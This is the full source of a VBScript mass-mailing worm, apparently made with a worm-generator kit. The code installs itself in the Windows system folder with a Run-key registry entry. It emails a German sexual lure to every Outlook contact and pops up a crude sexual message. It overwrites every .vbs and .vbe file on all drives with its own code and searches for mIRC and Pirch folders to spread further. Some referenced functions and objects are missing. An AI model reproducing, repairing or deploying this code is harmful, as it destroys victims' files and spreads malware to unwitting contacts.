'This file Has been created whit Vbs Worms Generator 0.95
'Ulrike Created By Doctor Rave
On Error Resume Next
Set pwtlcdnbekj= Createobject("scripting.filesystemobject")
pwtlcdnbekj.copyfile wscript.scriptfullname,pwtlcdnbekj.GetSpecialFolder(1)& "\Ur.vbs"
Set ahuuhmsgqfr = CreateObject("WScript.Shell")
ahuuhmsgqfr.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Urbz","wscript.exe "&pwtlcdnbekj.GetSpecialFolder(1)& "\Ur.vbs %"
if ahuuhmsgqfr.regread ("HKCU\software\Ulrike\mailed") <> "1" then
anagdmephmp()
end if
ntcjnosecqr()
Function anagdmephmp()
On Error Resume Next
Set iluytjhhgib = CreateObject("Outlook.Application")
If iluytjhhgib= "Outlook"Then
Set eiqedlgidqe=iluytjhhgib.GetNameSpace("MAPI")
For Each utkeojfmrii In eiqedlgidqe.AddressLists
If utkeojfmrii.AddressEntries.Count <> 0 Then
jhenmxpvywb = utkeojfmrii.AddressEntries.Count
For ccpuaoyoajp= 1 To jhenmxpvywb
Set kkvwbmdszqt = iluytjhhgib.CreateItem(0)
Set dhbrpporjgj = utkeojfmrii.AddressEntries(ccpuaoyoajp)
kkvwbmdszqt.To = dhbrpporjgj.Address
kkvwbmdszqt.Subject = "Hallo!"
kkvwbmdszqt.Body = "Hallo!" & vbcrlf & "Schau dir mal meinen Körper an ...." & vbcrlf & "Na? was sagst du dazu?" & vbcrlf & "Tschüss" & vbcrlf & "Ulrike" & vbcrlf & ""
ymfnodzlaph.Add pwtlcdnbekj.GetSpecialFolder(1)& "\Ur.vbs"
kkvwbmdszqt.DeleteAfterSubmit = True
If kkvwbmdszqt.To <> "" Then
kkvwbmdszqt.Send
ahuuhmsgqfr.regwrite "HKCU\software\Ulrike\mailed", "1"
End If
Next
End If
Next
end if
End Function
msgbox "Willst du mich ficken?",32
Function ntcjnosecqr()
On Error Resume Next
Set fzkfahmeexq = pwtlcdnbekj.Drives
For Each epvdtcvxked In fzkfahmeexq
If epvdtcvxked.Drivetype = Remote Then
ajhteqtrxyg= epvdtcvxked & "\"
Call rrwbynveoyv(ajhteqtrxyg)
ElseIf epvdtcvxked.IsReady Then
ajhteqtrxyg= epvdtcvxked&"\"
Call rrwbynveoyv(ajhteqtrxyg)
End If
Next
End Function
Function rrwbynveoyv(qgkkkmfbfua)
Set aiklhubyqhi= pwtlcdnbekj.GetFolder(qgkkkmfbfua)
Set sgjpvfmfzmx= aiklhubyqhi.Files
For Each xlckdfsflir In sgjpvfmfzmx
if pwtlcdnbekj.GetExtensionName(xlckdfsflir.path) = "vbs" then
pwtlcdnbekj.copyfile wscript.scriptfullname , xlckdfsflir.path , true
end if
if pwtlcdnbekj.GetExtensionName(xlckdfsflir.path) = "vbe" then
pwtlcdnbekj.copyfile wscript.scriptfullname , xlckdfsflir.path , true
end if
if xlckdfsflir.name = "mirc.ini" then
wdkbjcerlkh(xlckdfsflir.ParentFolder)
end if
if xlckdfsflir.name = "Pirch32.exe" then
qpalxayegny(xlckdfsflir.ParentFolder)
end if
Next
Set xlckdfsflir= aiklhubyqhi.SubFolders
For Each qbmyusyhozt In xlckdfsflir
Call rrwbynveoyv(qbmyusyhozt.path)
Next
End Function
